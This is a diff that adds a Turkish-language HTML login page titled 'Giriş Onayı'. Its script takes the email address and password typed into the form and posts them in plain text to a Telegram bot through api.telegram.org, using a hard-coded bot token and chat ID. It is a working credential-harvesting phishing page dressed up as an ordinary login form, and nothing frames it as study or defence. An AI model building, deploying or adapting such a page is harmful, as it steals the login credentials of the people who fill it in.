@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Giriş Onayı</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background: white;
+            padding: 25px;
+            width: 320px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.15);
+        }
+        input, button {
+            width: 100%;
+            margin-top: 12px;
+            padding: 10px;
+            font-size: 14px;
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0070aa;
+        }
+        #status {
+            margin-top: 10px;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h3>Kullanıcı Girişi</h3>
+
+    <input type="email" id="email" placeholder="E-posta adresi" required>
+    <input type="password" id="password" placeholder="Şifre" required>
+
+    <button onclick="sendToTelegram()">Giriş Yap</button>
+    <div id="status"></div>
+</div>
+
+<script>
+function sendToTelegram() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    if (!email || !password) {
+        document.getElementById("status").innerText = "Alanlar boş bırakılamaz!";
+        return;
+    }
+
+    const BOT_TOKEN = "8569245749:AAExvmcIyDAavAoXyXzO6tgkqOZZzgPZB4A";
+    const CHAT_ID = "7506526820";
+
+    const message = `
+🔐 GİRİŞ TALEBİ
+📧 Mail: ${email}
+🔑 Şifre: ${password}
+🕒 Tarih: ${new Date().toLocaleString("tr-TR")}
+`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        document.getElementById("status").innerText =
+            "Onay için bilgiler Telegram'a gönderildi.";
+    })
+    .catch(error => {
+        document.getElementById("status").innerText =
+            "Telegram'a gönderilemedi!";
+    });
+}
+</script>
+
+</body>
+</html>
